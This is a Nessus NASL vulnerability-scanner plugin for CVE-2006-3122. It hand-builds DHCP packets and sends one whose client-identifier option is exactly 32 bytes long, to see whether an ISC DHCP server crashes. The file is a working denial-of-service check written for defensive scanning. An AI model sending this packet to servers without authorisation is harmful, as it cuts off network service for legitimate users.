#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote DHCP server is prone to a denial of service attack. 

Description :

The remote host appears to be running a version of the ISC's DHCP
server that crashes when it receives a request with a client-
identifier option that is exactly 32 bytes long.  An unauthenticated
remote attacker can exploit this issue to deny service to legitimate
users. 

See also :

http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=380273

Solution :

Unknown at this time.

Risk factor :

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:N/I:N/A:P/B:N)";


if (description)
{
  script_id(22159);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-3122");
  script_bugtraq_id(19348);

  script_name(english:"ISC DHCP Server supersede_lease Denial of Service Vulnerability");
  script_summary(english:"Tries to crash the remote DHCP server");
 
  script_description(english:desc);

  script_category(ACT_DENIAL);
  script_family(english:"Denial of Service");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("dhcp.nasl");
  script_require_keys("DHCP/Running");

  exit(0);
}


include("raw.inc");


if (!get_kb_item("DHCP/Running")) exit(0);


sport = 68;
dport = 67;
zero = raw_string(0);
req_good = 
  mkbyte(1) +                          # Message type (1 => Boot request)
  mkbyte(1) +                          # hardware type (1 => ethernet)
  mkbyte(6) +                          # hardware address length
  mkbyte(0) +                          # hops
  mkdword(rand()) +                    # transaction id
  mkword(0) +                          # seconds elapsed
  mkword(0) +                          # bootp flags
  mkdword(0) +                         # client IP address
  mkdword(0) +                         # your (client) IP address
  mkdword(0) +                         # next server IP address
  mkdword(0) +                         # relay agent IP address
  mkdword(0xffffffff) + mkword(0xffff) + # client MAC address
  crap(data:zero, length:10) +         # ?
  crap(data:zero, length:64) +         # server host name
  crap(data:zero, length:128) +        # boot file name
  mkdword(0x63825363) +                # magic cookie
  mkbyte(53) + mkbyte(1) + mkbyte(1) + # option 53, DHCP message type = DHCP Discover
  mkbyte(255);
req_not_so_good = 
  mkbyte(1) +                          # Message type (1 => Boot request)
  mkbyte(1) +                          # hardware type (1 => ethernet)
  mkbyte(6) +                          # hardware address length
  mkbyte(0) +                          # hops
  mkdword(rand()) +                    # transaction id
  mkword(0) +                          # seconds elapsed
  mkword(0) +                          # bootp flags
  mkdword(0) +                         # client IP address
  mkdword(0) +                         # your (client) IP address
  mkdword(0) +                         # next server IP address
  mkdword(0) +                         # relay agent IP address
  mkdword(0xffffffff) + mkword(0xffff) + # client MAC address
  crap(data:zero, length:10) +         # ?
  crap(data:zero, length:64) +         # server host name
  crap(data:zero, length:128) +        # boot file name
  mkdword(0x63825363) +                # magic cookie
  mkbyte(53) + mkbyte(1) + mkbyte(1) + # option 53, DHCP message type = DHCP Discover
  mkbyte(61) + mkbyte(32) +            # option 61, client id
    crap(32) +
  mkbyte(255);
    


function dhcp_send_recv(request)
{
  if (isnull(request)) return NULL;

  local_var filter, ip, pkt, res, udp;
  global_var dport, sport;

  ip = ip();
  udp = udp(
    uh_dport : dport,
    uh_sport : sport
  );
  pkt = mkpacket(ip, udp, payload(request));

  filter = string(
    "udp and ",
    "src host ", get_host_ip(), " and ",
    "src port ", dport, " and ",
    "dst port ", sport
  );
  res = send_packet(pkt, pcap_active:TRUE, pcap_filter:filter);
  if (isnull(res)) return NULL;
  return (get_udp_element(udp:res, element:'data'));
}


# Send a valid request to ensure the server is up and accessible.
res = dhcp_send_recv(request:req_good);
if (
  strlen(res) < 8 ||
  getbyte(blob:res, pos:0) != 2 ||
  substr(res, 4, 7) != substr(req_good, 4, 7)
) exit(0);


# Try the exploit.
dhcp_send_recv(request:req_not_so_good);


# There's a problem if we can't get a response any more.
res = dhcp_send_recv(request:req_good);
if (isnull(res)) security_note(port:dport, protocol:"udp", data:desc);
